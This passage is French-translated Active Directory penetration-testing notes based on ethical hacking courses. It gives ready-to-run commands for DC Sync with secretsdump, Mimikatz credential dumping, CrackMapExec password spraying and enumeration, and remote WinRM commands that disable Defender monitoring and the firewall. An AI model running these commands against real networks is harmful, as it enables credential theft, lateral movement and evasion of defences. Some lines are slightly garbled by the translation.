 - Une attaque DC Sync utilise des commandes du protocole distant du service de réplication Active Directory (MS-DRSR) pour se faire passer pour un contrôleur de domaine (DC) afin d'obtenir les informations d'identification de l'utilisateur d'un autre DC.
 - Nous avons besoin d'une autorisation pour répliquer réellement les informations AD.  Par défaut, les contrôleurs de domaine disposent de cette autorisation appelée « Réplication des modifications de répertoire » et « Réplication de toutes les modifications de répertoire ».  Ces deux autorisations sont nécessaires pour effectuer une attaque DC Sync.
 - Le moyen le plus courant d'obtenir ces autorisations consiste à abuser du groupe d'autorisations Microsoft Exchange Windows.  Il s'agit du service de serveur de messagerie de Microsoft et s'intègre à Active Directory.  AD accorde à ce groupe l'autorisation de modifier les autorisations à la racine du domaine.  Donc, si nous entrons dans ce groupe, nous pouvons en abuser pour effectuer une attaque.
 - Cela signifie que les informations d'identification que vous utilisez pour cette pièce jointe doivent appartenir à ce groupe.
 - `python3 secretsdump.py` htb.local/username:pasword@pc1.htb.local`
 - où pc1 est un nom de machine.
 - Utilisez le hachage acquis pour effectuer l'attaque de hachage.


 **Aperçu de Mimikatz**
 - [Mimikatz](https://github.com/gentilkiwi/mimikatz) est un outil utilisé pour afficher et voler des informations d'identification, générer des tickets Kerberos et exploiter des attaques.
 - Vide les informations d'identification stockées en mémoire.
 - Juste quelques attaques : Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket
 - Les différents modules utilisés par mimikatz sont expliqués sur son [wiki](https://github.com/gentilkiwi/mimikatz/wiki)

 **Dumping d'informations d'identification avec Mimikatz (creds dumping)**
 - Téléchargez le fichier binaire sur la machine compromise.
 - Ouvrez un CMD, accédez au dossier téléchargé et exécutez le fichier exe.  ./mimikatz.exe
 - Exécutez le mode débogage : `privilege::debug` .  Le débogage signifie qu'il nous permet de déboguer un processus auquel nous n'aurions pas accès autrement.  Exemple : vider les informations de la mémoire.
 - Videz le passwd de connexion.
	 - `sekurlsa ::logonpassword`
 - Vider les hachages SAM
	 - `lsadump::sam`
 - Vider le LSA
	 - `lsadump::lsa /patch`
	
 **Introduction à CrackMapExec de l'Armée Suisse**
 - Un outil de post-exploitation qui permet d'automatiser l'évaluation de la sécurité des grands réseaux Active Directory
 - Protocoles disponibles : ldap, mssql, smb, ssh, winrm <br> <br>

 ** Vérification de la politique de passwd CrackMapExec **
 - Avant d'effectuer une attaque par force brute en utilisant crackmapexec, il est toujours utile d'analyser sa politique de passwd, afin de ne pas déconnecter les utilisateurs de leur ordinateur.  Cela aide également à [générer un passwd](https://github.com/nirajkharel/PasswordCracking/blob/main/README.md).
 - `crackmapexec smb IP --pass-pol -u '' -p ''`


 **Pulvérisation de passwd SwissArmy CrackMapExec (CrackMapExec Password Spraying)**
 - Pulvériser les informations d'identification sur la plage IP
   - `crackmapexec smb <ip start>-<ip end> -u ippsec -p passwd1234 --no-bruteforce`
   - Il montrera également si nous avons un accès administrateur, s'il a un accès administrateur, il affichera un message (Pwn3d !).
 - Pulvérisez différents utilisateurs et combinaisons de mots de passe
   - `crackmapexec smb <ip start>-<ip end> -u username.txt -p passwd.txt --no-bruteforce`
 - Pulvériser les hachages sur la plage IP
   - `crackmapexec smb <ip start>-<ip end> -H hashes.txt --no-bruteforce`
 - Par défaut, CrackMapExec se ferme après une connexion réussie.  L'utilisation de l'indicateur `--continue-on-success` continuera à pulvériser même après qu'un passwd valide soit trouvé.  <br><br>

 **Armée Suisse CrackMapExec ENUM 1**
 - Utilisez les modules smb pour faire une énumération des partages
   - `crackmapexec smb <ip start>-<ip end> -u ippsec -p passwd1234 --shares`
   - Il fournira le nom du partage, les autorisations et les remarques
   - Nous pouvons suivre le résultat obtenu en utilisant SMBCLIENT pour accéder aux partages par la suite.
 - Séances
   - Jetez un œil à une session et voyez s'il y a des sessions en cours auxquelles nous avons accès.
   - `crackmapexec smb <ip start>-<ip end> -u ippsec -p passwd1234 --sessions`
 - Énumérer les disques
   - `crackmapexec smb <ip start>-<ip end> -u ippsec -p passwd1234 --disks`
 - Utilisateurs connectés
   - Voir si nous avons des utilisateurs connectés au réseau
   - `crackmapexec smb <ip start>-<ip end> -u ippsec -p passwd1234 --loggedon-users`
   - Si nous sommes un administrateur local, mais que nous ne sommes peut-être pas un administrateur de domaine, si les utilisateurs connectés sont des administrateurs de domaine, nous pourrons vider les hachages et effectuer une attaque Pass The Hash et obtenir une session.
 - Obtenez tous les utilisateurs
   - `crackmapexec smb <ip start>-<ip end> -u ippsec -p Password12345 --users` <br><br>

**Armée Suisse CrackMapExec ENUM 2**
 - Enumerate RID : l'identifiant relatif (RID) est un numéro de longueur variable qui est attribué aux objets lors de leur création et devient une partie de l'identifiant de sécurité (SID) de l'objet qui identifie de manière unique un compte ou un groupe au sein d'un domaine.  Le SID de domaine est le même sur un même domaine mais le RID est différent selon l'objet.  Windows crée un RID par défaut dans Active Directory.  Exemple, RID 501 pour l'administrateur, 502 pour le compte par défaut et 503 pour le compte invité.
   - `crackmapexec smb <ip start>-<ip end> -u ippsec -p Password12345 --rid-brute` Il montrera également quels sont les groupes, utilisateurs et alias.
 - Énumérer la politique de passwd
   - `crackmapexec smb <ip start>-<ip end> -u ippsec -p Password12345 --pass-pol` <br> <br>

 **Exécution de la commande SiwsArmy CrackMapExec**
 - `crackmapexec winrm <ip> -u ippsec -p Password12345 -x 'whoami'`
 - Là où <ip> ont un accès au domaine local, -x est une ligne de commande, -X un script PowerShell ou une ligne de commande.
 - `crackmapexec winrm <ip> -u ippsec -p Password12345 -X 'whoami'`
 - Vérifier l'accès de l'administrateur local
   - `crackmapexec winrm <ip> -u ippsec -p Password12345 -X 'whoami /groups'`
   - S'il fait partie de BUILTIN\Administrator, il dispose d'un accès administrateur local sur la machine.
   - Donner l'accès aux administrateurs locaux signifie leur donner un contrôle total sur l'ordinateur local.
 - Obtenir l'état de l'ordinateur : comme l'état de l'antivirus, les protections, la protection en temps réel.
   - `crackmapexec winrm <ip> -u ippsec -p Password12345 -X 'Get-MpComputerstatus`
 - Si nous sommes un administrateur de domaine, nous pouvons désactiver de telles choses.
 - Désactiver la surveillance
   - `crackmapexc winrm <ip> -u ippsec -p Password12345 -X 'Set-MpPreference -DisableRealtimeMonitoring $true`
 - Désactiver l'antivirus
   - `crackmapexec winrm <ip> -u ippsec -p Password12345 -X 'Set-MpPreference -DisableIOAVProtection $true`
 - Vérifiez si ceux-ci sont désactivés ou non
   - `crackmapexec winrm <ip> -u ippsec -p Password12345 -X 'Get-MpComputerstatus'`
 - Afficher tous les profils, publics privés, pare-feu
   - `crackmapexec winrm <ip> -u ippsec -p Password12345 -X 'netsh advfirewall show allprofiles'`
   - S'ils sont activés, désactivez-les avec
   - `crackmapexec winrm <ip> -u ippsec -p Password12345 -X 'netsh advfirewall set allprofiles state off'`
 - Énumérer les répertoires
   - `crackmapexec winrm <ip> -u ippsec -p Password12345 -X 'dir C:\Users\ippsec'`  
 - Lire des fichiers
   - `crackmapexec winrm <ip> -u ippsec -p Password12345 -X 'type C:\Users\ippsec\users.txt'`

 ### Les références
 - [TCM Security - Heath Adams](https://academy.tcm-sec.com) (La plupart des contenus)
 - [Les cinq meilleures façons d'obtenir un domaine sur votre réseau interne avant le lancement par Adam Toscher.](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your- réseau-interne-avant-le-déjeuner-édition-2018-82259ab73aaa)
 - [Piratage éthique pratique par TCM Security.](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)
 - [Pentesting Active Directory - Équipe rouge par informatique et sécurité.](https://www.youtube.com/watch?v=gSpQMzINB6U&list=PLziMzyAZFGMf8rGjtpV6gYbx5hozUNeSZ)
 - https://www.youtube.com/watch?v=ajOr4pcx6T0
 - https://medium.com/@Shorty420/kerberoasting-9108477279cc
 - https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
 - https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
 - https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
 - L'original en Anglais [ici](https://github.com/nirajkharel/AD-Pentesting-Notes/blob/main/README.md)

